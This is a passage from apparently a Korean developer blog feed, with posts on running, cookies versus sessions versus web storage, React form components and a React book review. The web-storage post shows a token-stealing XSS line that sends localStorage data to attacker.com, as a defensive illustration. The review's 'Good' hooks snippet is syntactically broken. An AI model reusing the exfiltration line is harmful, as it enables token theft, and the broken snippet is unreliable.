코르티솔 수치를 조절하여 불안감을 줄이고, 복잡한 생각을 정리하는 ‘움직이는 명상’의 효과가 있다</li> <li>수면의 질 향상: 규칙적인 달리기는 생체 리듬을 조절하여 더 깊고 편안한 잠을 자는데 도움을 준다.</li> </ul> </li> <li>Physical Health <ul> <li>체중 관리: 짧은 시간에도 칼로리 소모량이 큰 편이며, 특히 달리기 후에도 신진대사가 활발하게 유지되는 ‘애프터번(Afterburn)’ 효과를 누릴 수 있다.</li> <li>심혈관/근력 강화: 심폐지구력이 향상돼서 심장병·고혈압 위험을 감소시키며, 혈액순환이 좋아지고 체력 회복이 빨라진다. 또한, 하체 근력이 강화되어 골다공증 예방과 바른 자세를 유지하는데 도움이 된다.</li> <li>인지 기능 향상: 뇌로 가는 혈류량이 증가하면서 기억력을 담당하는 해마가 활성화되는데, 이는 학습 능력과 집중력 향상으로 이어진다.</li> </ul> </li> </ul> <hr/>]]></content><author><name></name></author><category term="running"/><category term="hobby"/><category term="whyIrun"/><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">cookie vs session vs webStorage</title><link href="https://chanmi-lee.github.io/articles/2022-04/cookie-session-webstorage/" rel="alternate" type="text/html" title="cookie vs session vs webStorage"/><published>2022-04-03T00:00:00+00:00</published><updated>2022-04-03T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2022-04/cookie-session-webstorage</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2022-04/cookie-session-webstorage/"><![CDATA[<hr/> <p>cookie, session, webStorage(localStorage &amp; sessionStorage)는 모두 웹 클라이언트와 서버 간 상태 관리 또는 데이터 저장을 위한 기술이지만, 저장 위치, 만료 시점, 전송 여부, 보안 등에서 큰 차이가 있습니다.</p> <h3 id="summary">Summary</h3> <table> <thead> <tr> <th>항목</th> <th>Cookie</th> <th>Session (서버)</th> <th>Web Storage (localStorage, sessionStorage)</th> </tr> </thead> <tbody> <tr> <td>📦 저장 위치</td> <td>클라이언트(브라우저), 요청 시 서버로 전송됨</td> <td>서버 (ex. 메모리, Redis, DB)</td> <td>클라이언트(브라우저), 서버에는 전송되지 않음</td> </tr> <tr> <td>🔁 서버 전송 여부</td> <td>✅ 매 요청마다 자동으로 서버에 전송됨</td> <td>❌ 별도 쿠키나 토큰 없으면 식별 불가</td> <td>❌ 서버에 전송되지 않음</td> </tr> <tr> <td>⏳ 만료 시점</td> <td>expires 또는 max-age로 지정 가능</td> <td>브라우저 종료 or 설정한 타임아웃</td> <td>localStorage: 수동 삭제 전까지 유지, sessionStorage: 탭 종료 시</td> </tr> <tr> <td>📦 저장 용량</td> <td>약 4KB</td> <td>서버 설정에 따름</td> <td>약 5~10MB (브라우저별 상이)</td> </tr> <tr> <td>🔐 보안</td> <td>HTTPOnly/secure 옵션 설정 가능</td> <td>일반적으로 안전하나 인증 토큰 노출 우려 있음</td> <td>XSS 공격에 취약 (스크립트 접근 가능)</td> </tr> <tr> <td>🧩 주요 사용 목적</td> <td>인증, 세션 식별, 사용자 기본 설정 저장</td> <td>사용자 로그인 상태 유지</td> <td>UI 상태, 임시 폼 데이터, 캐시 등 클라이언트 전용 정보</td> </tr> <tr> <td>🧱 설정 방법</td> <td>Set-Cookie (서버) 또는 JS (document.cookie)</td> <td>서버측 미들웨어 + 세션 ID 식별 쿠키</td> <td>JS API 사용 (localStorage.getItem, setItem)</td> </tr> </tbody> </table> <hr/> <h3 id="-1-cookie">🍪 1. Cookie</h3> <ul> <li>서버가 클라이언트에 Set-Cookie 헤더로 내려보냄</li> <li>클라이언트는 이후 모든 요청에 해당 쿠키를 자동으로 함께 전송</li> <li>용도: 인증 세션 식별자 저장, 다크모드 설정 저장 등</li> </ul> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="nb">Set</span><span class="o">-</span><span class="nx">Cookie</span><span class="p">:</span> <span class="nx">sessionId</span><span class="o">=</span><span class="nx">abc123</span><span class="p">;</span> <span class="nx">HttpOnly</span><span class="p">;</span> <span class="nx">Max</span><span class="o">-</span><span class="nx">Age</span><span class="o">=</span><span class="mi">3600</span><span class="p">;</span> <span class="nx">Secure</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">username=seungjun; path=/;</span><span class="dl">"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="️-2-session">🗂️ 2. Session</h3> <ul> <li>서버에 세션 ID와 사용자 데이터를 저장하고, 클라이언트는 쿠키로 sessionId만 보관</li> <li>Express, Django 등 대부분의 서버 프레임워크에서 지원</li> <li>세션은 메모리, Redis, DB 등 다양한 저장소에 저장 가능</li> </ul> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="c1">// Express 예시</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">session</span><span class="p">({</span>
<span class="na">secret</span><span class="p">:</span> <span class="dl">'</span><span class="s1">my-secret</span><span class="dl">'</span><span class="p">,</span>
<span class="na">resave</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
<span class="na">saveUninitialized</span><span class="p">:</span> <span class="kc">true</span>
<span class="p">}));</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="-3-web-storage-localstorage--sessionstorage">💾 3. Web Storage (localStorage / sessionStorage)</h3> <ul> <li>브라우저 전용 저장소로, 서버와는 무관</li> <li>클라이언트 측에서 자바스크립트로만 접근 가능</li> <li>용도: 페이지 상태 유지, 임시 데이터 캐싱, 테마 설정 등</li> </ul> <blockquote> <p>❗주의: localStorage에 토큰 저장 시 XSS에 취약 → 민감 정보는 절대 저장 금지</p> </blockquote> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="c1">// localStorage</span>
<span class="nx">localStorage</span><span class="p">.</span><span class="nf">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">theme</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">dark</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">theme</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">theme</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">// sessionStorage</span>
<span class="nx">sessionStorage</span><span class="p">.</span><span class="nf">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">step</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">2</span><span class="dl">"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="-보안-리스크-비교">🔐 보안 리스크 비교</h3> <table> <thead> <tr> <th>항목</th> <th>Cookie</th> <th>Session</th> <th>localStorage / sessionStorage</th> </tr> </thead> <tbody> <tr> <td>📤 자동 전송</td> <td>✅ (매 요청마다)</td> <td>✅ (sessionId만 전송)</td> <td>❌ (명시적 전송만)</td> </tr> <tr> <td>❗ XSS 취약성</td> <td>❌ (document.cookie로 읽힘 unless HttpOnly)</td> <td>❌ (세션ID 탈취 가능성)</td> <td>✅ 심각함 (스크립트로 직접 접근 가능)</td> </tr> <tr> <td>❗ CSRF 취약성</td> <td>✅ 자동 전송으로 인해 위험</td> <td>✅ 동일</td> <td>❌ 안전 (자동 전송 X)</td> </tr> <tr> <td>🔒 보호 방법</td> <td>HttpOnly, Secure, SameSite</td> <td>SameSite + 토큰 재검증</td> <td>민감 정보 절대 저장 금지, CSP 설정</td> </tr> </tbody> </table> <hr/> <h3 id="-xss-예시-위험-localstorage">🔐 XSS 예시 위험 (localStorage)</h3> <blockquote> <p>⚠️ localStorage에 인증 토큰 절대 저장 금지!</p> </blockquote> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre><span class="c1">// 악성 스크립트</span>
<span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">authToken</span><span class="dl">'</span><span class="p">);</span>
<span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://attacker.com/steal</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="na">body</span><span class="p">:</span> <span class="nx">token</span> <span class="p">});</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <p>인증 방식 중에서도 실무에서 가장 많이 쓰이는 두 가지엔 JWT 기반 인증 구조와 OAuth 2.0 인증 방식이 있습니다.</p> <p>JWT는 자체 인증 시스템을 구현할 때 stateless하게 사용자 인증 정보를 주고받을 수 있어서 확장성과 성능 면에서 유리합니다. 반면 OAuth 2.0은 Google, Naver 같은 외부 서비스의 인증을 위임받는 구조로, 복잡하지만 사용자 진입장벽을 낮출 수 있는 장점이 있습니다. 실무에서는 둘을 혼합해 Access Token은 JWT로 구성하고, OAuth 로그인을 통해 초기 인증을 대체하는 방식도 자주 사용하곤 합니다.</p> <hr/> <h3 id="jwt">JWT</h3> <p>JWT는 3개의 Base64 인코딩된 문자열을 점으로 이어 붙인 형태입니다.</p> <pre><code class="language-typograms">xxxxx.yyyyy.zzzzz
│     │      │
│     │      └─ Signature (비밀키 기반 서명)
│     └──────── Payload (sub, exp 등)
└────────────── Header (alg, typ)

// 예시 payload
{
  "sub": "user123",
  "exp": 1713000000,
  "role": "admin"
}
</code></pre> <p>JWT 기반 인증 구조는 하기와 같은 요청 흐름을 가집니다.</p> <pre><code class="language-typograms">[1] 로그인 요청
    ┌────────────┐
    │  Client    │
    └────┬───────┘
         ↓
POST /login (ID, PW)
         ↓
[2] 서버에서 ID/PW 검증 → JWT 생성
         ↓
[3] 응답: JWT (Access Token)
         ↓
저장 방식
 ├─ 쿠키 (HttpOnly)      ← 보안에 유리
 └─ localStorage        ← 사용 편하지만 XSS 취약

[4] 이후 요청 시
Authorization: Bearer {JWT}
</code></pre> <table> <thead> <tr> <th>항목</th> <th>설명</th> </tr> </thead> <tbody> <tr> <td>✅ 장점</td> <td>상태 비저장 (stateless), 확장성 우수, 빠른 인증</td> </tr> <tr> <td>❗ 위험</td> <td>탈취 시 재사용 가능 → exp, refresh token, HttpOnly 등 보완 필수</td> </tr> <tr> <td>💡 실전 전략</td> <td>Access Token 짧게 (15분), Refresh Token은 HttpOnly 쿠키에 저장 &amp; 재발급 API 운영</td> </tr> </tbody> </table> <hr/> <h3 id="oauth-20">OAuth 2.0</h3> <table> <thead> <tr> <th>항목</th> <th>설명</th> </tr> </thead> <tbody> <tr> <td>Authorization Server</td> <td>사용자 인증 &amp; 토큰 발급 (Google, Kakao 등)</td> </tr> <tr> <td>Resource Server</td> <td>보호된 자원 (사용자 정보 등)</td> </tr> <tr> <td>Client</td> <td>프론트엔드 앱 or 백엔드 서버</td> </tr> <tr> <td>Access Token</td> <td>외부 API 호출에 사용 (일회성, 유효시간 짧음)</td> </tr> <tr> <td>Refresh Token</td> <td>Access Token 재발급용, 노출 주의</td> </tr> </tbody> </table> <p>OAuth 2.0 기반 인증 구조는 하기와 같은 요청 흐름을 가집니다.</p> <pre><code class="language-typograms">[1] Client → Authorization Server (ex. Google)
     사용자 로그인 및 권한 승인
           ↓
[2] Redirect with Authorization Code
           ↓
[3] Client → Authorization Server
     POST /token (Authorization Code)
           ↓
[4] Access Token + (Refresh Token)
           ↓
[5] Access Token → Resource Server 호출
           ↓
[6] 사용자 정보 응답
</code></pre>]]></content><author><name></name></author><category term="cookie"/><category term="session"/><category term="webstorage"/><category term="localstorage"/><category term="sessionStorage"/><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">[React] Controlled vs Uncontrolled Component</title><link href="https://chanmi-lee.github.io/articles/2021-08/react-controlled-uncontrolled-component/" rel="alternate" type="text/html" title="[React] Controlled vs Uncontrolled Component"/><published>2021-08-12T00:00:00+00:00</published><updated>2021-08-12T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-08/react-controlled-uncontrolled-component</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-08/react-controlled-uncontrolled-component/"><![CDATA[<h2 id="-react-제어-컴포넌트-vs-비제어-컴포넌트">🎯 React 제어 컴포넌트 vs 비제어 컴포넌트</h2> <p>React에서 폼을 다룰 때 가장 먼저 부딪히는 개념 중 하나가 바로 제어(Controlled) 컴포넌트와 비제어(Uncontrolled) 컴포넌트입니다. 이 두 방식은 입력값을 어떻게 관리하느냐에 따라 나뉘며, 각각 장단점과 사용 목적이 다릅니다.</p> <p>이번 포스팅에서는 이 두 가지 개념을 정의, 차이점, 코드 예시를 통해 쉽게 이해해보겠습니다.</p> <hr/> <h3 id="제어-컴포넌트-controlled-component">제어 컴포넌트 (Controlled Component)</h3> <p>정의: 입력 요소의 상태(value)를 React 컴포넌트의 state로 관리하는 방식입니다. 즉, 입력값의 소유권이 React에 있습니다.</p> <h4 id="특징">특징</h4> <ul> <li>모든 값은 useState나 this.state로 관리됨</li> <li>onChange 이벤트 핸들러를 통해 state를 업데이트</li> <li>React가 폼의 상태를 전적으로 제어</li> </ul> <p>예제</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="code"><pre><span class="k">import</span> <span class="nx">React</span><span class="p">,</span> <span class="p">{</span> <span class="nx">useState</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">react</span><span class="dl">'</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">ControlledForm</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">name</span><span class="p">,</span> <span class="nx">setName</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">handleChange</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nf">setName</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="p">};</span>

<span class="kd">const</span> <span class="nx">handleSubmit</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
<span class="nf">alert</span><span class="p">(</span><span class="s2">`입력한 이름: </span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">};</span>

<span class="k">return </span><span class="p">(</span>

<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">onSubmit</span><span class="o">=</span><span class="p">{</span><span class="nx">handleSubmit</span><span class="p">}</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">name</span><span class="p">}</span> <span class="nx">onChange</span><span class="o">=</span><span class="p">{</span><span class="nx">handleChange</span><span class="p">}</span> <span class="sr">/</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">제출</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="비제어-컴포넌트-uncontrolled-component">비제어 컴포넌트 (Uncontrolled Component)</h3> <p>정의: 입력 요소의 상태를 DOM이 직접 관리하는 방식입니다. 즉, 입력값의 소유권이 실제 HTML 요소에 있습니다.</p> <p>특징</p> <ul> <li>ref를 사용해 DOM 요소에 직접 접근</li> <li>상태를 직접 추적하지 않아 코드가 간단할 수 있음</li> <li>외부 라이브러리 또는 레거시 코드와 호환성이 좋음</li> </ul> <p>예제</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="code"><pre><span class="k">import</span> <span class="nx">React</span><span class="p">,</span> <span class="p">{</span> <span class="nx">useRef</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">react</span><span class="dl">'</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">UncontrolledForm</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="nx">nameRef</span> <span class="o">=</span> <span class="nf">useRef</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">handleSubmit</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
<span class="nf">alert</span><span class="p">(</span><span class="s2">`입력한 이름: </span><span class="p">${</span><span class="nx">nameRef</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">value</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">};</span>

<span class="k">return </span><span class="p">(</span>

<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">onSubmit</span><span class="o">=</span><span class="p">{</span><span class="nx">handleSubmit</span><span class="p">}</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">ref</span><span class="o">=</span><span class="p">{</span><span class="nx">nameRef</span><span class="p">}</span> <span class="sr">/</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">제출</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <h3 id="summary">Summary</h3> <table> <thead> <tr> <th>항목</th> <th>제어 컴포넌트</th> <th>비제어 컴포넌트</th> </tr> </thead> <tbody> <tr> <td>상태 관리</td> <td>React <code class="language-plaintext highlighter-rouge">state</code></td> <td>DOM 자체</td> </tr> <tr> <td>접근 방식</td> <td><code class="language-plaintext highlighter-rouge">value</code>와 <code class="language-plaintext highlighter-rouge">onChange</code> 사용</td> <td><code class="language-plaintext highlighter-rouge">ref</code>를 통한 DOM 접근</td> </tr> <tr> <td>폼 동기화</td> <td>가능 (일관된 상태 유지)</td> <td>어려움</td> </tr> <tr> <td>초기 값 설정</td> <td><code class="language-plaintext highlighter-rouge">useState</code>로 직접 설정</td> <td><code class="language-plaintext highlighter-rouge">defaultValue</code> 속성 사용</td> </tr> <tr> <td>적합한 상황</td> <td>복잡한 폼, 유효성 검사</td> <td>간단한 입력, 빠른 프로토타이핑</td> </tr> </tbody> </table> <hr/> <h4 id="-어떤-걸-써야-할까">📝 어떤 걸 써야 할까?</h4> <ul> <li>제어 컴포넌트: 대부분의 경우 추천. 특히 유효성 검사, 조건부 렌더링, 실시간 폼 제어가 필요할 때.</li> <li>비제어 컴포넌트: 간단한 입력, 퍼포먼스에 민감하거나 외부 라이브러리 연동 시 유용.</li> </ul> <h4 id="-마무리">💬 마무리</h4> <p>React에서 폼 데이터를 다루는 방법은 다양하지만, 그 핵심은 제어와 비제어의 차이를 이해하는 데 있습니다. 어떤 방식이 더 좋다고 단정할 수는 없으며, 상황에 맞는 선택이 중요합니다.</p> <p>여러분은 어떤 방식이 더 익숙한가요? 댓글로 여러분의 경험을 공유해주세요! 😊</p>]]></content><author><name></name></author><category term="react"/><category term="component"/><category term="controlledcomponent"/><category term="uncontrolledcomponent"/><summary type="html"><![CDATA[🎯 React 제어 컴포넌트 vs 비제어 컴포넌트]]></summary></entry><entry><title type="html">[리뷰] “Learning React”를 읽고</title><link href="https://chanmi-lee.github.io/articles/2021-07/review-of-learning-react/" rel="alternate" type="text/html" title="[리뷰] “Learning React”를 읽고"/><published>2021-07-25T00:00:00+00:00</published><updated>2021-07-25T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-07/review-of-learning-react</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-07/review-of-learning-react/"><![CDATA[<blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "한빛미디어 &lt;나는 리뷰어다&gt; 활동으로, 책을 제공받아 작성된 서평입니다."
</code></pre></div> </div> </blockquote> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/learning-react-480.webp 480w,/assets/img/posts/learning-react-800.webp 800w,/assets/img/posts/learning-react-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/learning-react.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="learning-react-리뷰">Learning React 리뷰</h3> <p>이 책은 ES6 이후의 최신 자바스크립트 문법과 함수형 프로그래밍으로부터 시작하여, 함수 컴포넌트를 만드록 합성하는 방법과 다양한 Hook을 사용하고 정의하는 방법, 비동기 데이터 처리 등 실무에서 리액트를 사용할 때 필요한 개념 지식을 예제와 함께 설명해주고 있다. 뿐만 아니라, 리액트의 토대가 되는 상태 관리, 리액트 라우터, 여러가지 테스트 기법, 서버 사이드 랜더링 등에 대해서도 다루고 있다.</p> <p>리액트 입문자에게는 학습 로드맵을 제사함으로써 배우는 과정에서의 혼란을 최소화하도록 도와준다. 또한, 현재 실무에서 리액트를 사용하는 개발자에게도 좀 더 리액트스러운 개발 방향을 차근차근 안내해주고 있다.</p> <h3 id="책의-구성">책의 구성</h3> <p>책의 초반부에는 최신 자바스크립트 기술과 리액트 탄생의 바탕이 된 패러다임인 함수형 프로그래밍의 개념과 예시로 시작한다. 리액트를 통해 컴포넌트를 생성하고 이를 관리할 때, 가독성, 재사용성, 테스트 가능성이 좋은 패턴을 더 많이 활용할 수 있도록 구체적인 예시 코드를 제공해주어 이해를 돕고 있다. JSX를 통해 자바스크립트 코드 안에서 태그 기반의 구문을 써서 간편하게 리액트 앨리먼트를 생성하는 방법을 예제와 함께 제시해준다.</p> <p>이어서, 상태(State)를 가진 컴포넌트를 만드는 방법과 컴포넌트간의 상태를 전달하는 방법, 그리고 상태가 있는 컨텍스트 프로바이더(Stateful context provider)를 통해 리액트 애플리케이션에서 관심사를 분리하는 방법을 다루고 있다.</p> <ul> <li>상태를 리액트 함수 컴포넌트에 넣을 때는 훅스(Hooks)라고 부르는 리액트 기능을 사용한다. (리액트 v16.8.0 이전에는 클래스 컴포넌트를 사용하여 컴포넌트에 상태를 추가하였다.)</li> <li>리액트에서 제공하는 useState, useEffect, useRef, useContext 외에도 커스텀 훅을 예제와 함께 제시한다. (불필요한 중복을 추상화하여 제거하거나, 렌더링 성능을 개선하는 훅스 등이 있다.)</li> </ul> <blockquote> <p>Hooks 사용 시 규칙</p> </blockquote> <ul> <li>Hooks는 컴포넌트 영역 안에서만 호출해야 한다.</li> <li>기능을 가능한 작은 단위의 여러 훅으로 나누면 좋다.</li> <li>리액트 함수의 최상위 수준에서만 훅을 사용해야 한다. (즉, 조건문이나 루프 등에서 훅을 사용하면 안된다.)</li> </ul> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="code"><pre><span class="c1">// Good: 훅 안에 if문 등의 조건문을 사용해야 하는 경우는 아래와 같은 방식으로 훅을 사용한다</span>
<span class="kd">function</span> <span class="nf">Counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">count</span><span class="p">,</span> <span class="nx">setCount</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">checked</span><span class="p">,</span> <span class="nx">toggle</span><span class="p">]</span> <span class="o">=</span>
<span class="nf">useState</span><span class="p">(</span>
<span class="nx">count</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">count</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span>
<span class="p">?</span> <span class="nx">undefind</span>
<span class="p">:</span> <span class="o">!</span><span class="nx">c</span><span class="p">,</span>
<span class="p">(</span><span class="nx">count</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">?</span> <span class="kc">undefined</span>
<span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Bad: count &gt; 5일 때만 훅이 호출되어야 하는 뜻으로 아래와 같이 작성하면, 이로 인해 배열의 값이 사라지게 된다.</span>
<span class="c1">// count &gt; 5 : [count, checked, DependencyArray, 0, DependecyArray]</span>
<span class="c1">// count &lt;= 5 : [count, DependencyArray, 1]</span>
<span class="kd">function</span> <span class="nf">Counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">count</span><span class="p">,</span> <span class="nx">setCount</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">if </span><span class="p">(</span><span class="nx">count</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
<span class="nx">count</span> <span class="p">[</span><span class="nx">checked</span><span class="p">,</span> <span class="nx">toggle</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>대부분의 프로그래밍 언어가 코드를 실행하기 전에 컴파일 단계를 거치는데 언어마다 상당히 엄격한 규칙이 있고, 이를 지키지 않는 코드는 컴파일되지 않는다. 반면 자바스크립트는 그런 규칙이 적고 컴파일러를 사용하지 않아 런타임 환경에서 오류를 마주하는 경우가 상대적으로 빈번하다. 이를 보완하기 위해, 작성한 코드를 분석해서 구체적인 규칙을 따르도록 도와주는 도구로 JSHint, JSLint를 소개하고 CRA 프로젝트에서 ESLint, Prettier를 설정하고 규칙을 테스트하는 방법을 보여준다.</p> <p>리액트 앱에서 타입 검사를 수행하기 위해 대표적인 prop-type 라이브러리, flow, TypeScript를 사용하는 세 가지 방법도 이어서 설명한다. 또한, 프로덕션 배포 시 모듈 번들러인 웹팩의 장점과 설정 방법들도 코드와 함께 설명해준다. 웹팩을 사용하면 의존 관계가 있는 여러 파일들을 (ex- JavaScript, LESS, CSS, JSX 등) 받아서 한 파일로 묶어주는데, 브라우저는 이 번들 파일을 한 번만 읽기 때문에 <strong>네트워크 성능이 개선</strong>된다는 장점이 있다.</p> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://www.hanbit.co.kr/store/books/look.php?p_code=B3942115529">한빛출판사: Learning React</a></p>]]></content><author><name></name></author><category term="React"/><summary type="html"><![CDATA["한빛미디어 &lt;나는 리뷰어다&gt; 활동으로, 책을 제공받아 작성된 서평입니다."]]></summary></entry><entry><title type="html">[번역] Lodash를 대체하는 순수 자바스크립트 함수</title><link href="https://chanmi-lee.github.io/articles/2021-03/Pure-JavaScript-Functions-as-a-Replacement-for-Lodash/" rel="alternate" type="text/html" title="[번역] Lodash를 대체하는 순수 자바스크립트 함수"/><published>2021-03-07T00:00:00+00:00</published><updated>2021-03-07T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-03/Pure-JavaScript-Functions-as-a-Replacement-for-Lodash</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-03/Pure-JavaScript-Functions-as-a-Replacement-for-Lodash/"><![CDATA[<blockquote> <p>이 글은 원저자 <a href="https://medium.com/@rcdexta">RC</a> 의 허락을 받아 <a href="https://blog.bitsrc.io/you-dont-need-lodash-or-how-i-started-loving-javascript-functions-3f45791fa6cd">Pure JavaScript Functions as a Replacement for Lodash</a> 을 번역한 글입니다</p> </blockquote> <figure> <picture> <source class="responsive-img-srcset" srcset="https://miro.medium.com/max/1400/1*zbJmSCECXK13rS7-4CsRzQ-480.webp 480w,https://miro.medium.com/max/1400/1*zbJmSCECXK13rS7-4CsRzQ-800.webp 800w,https://miro.medium.com/max/1400/1*zbJmSCECXK13rS7-4CsRzQ-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="https://miro.medium.com/max/1400/1*zbJmSCECXK13rS7-4CsRzQ.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h2 id="함수형-프로그래밍">함수형 프로그래밍?</h2> 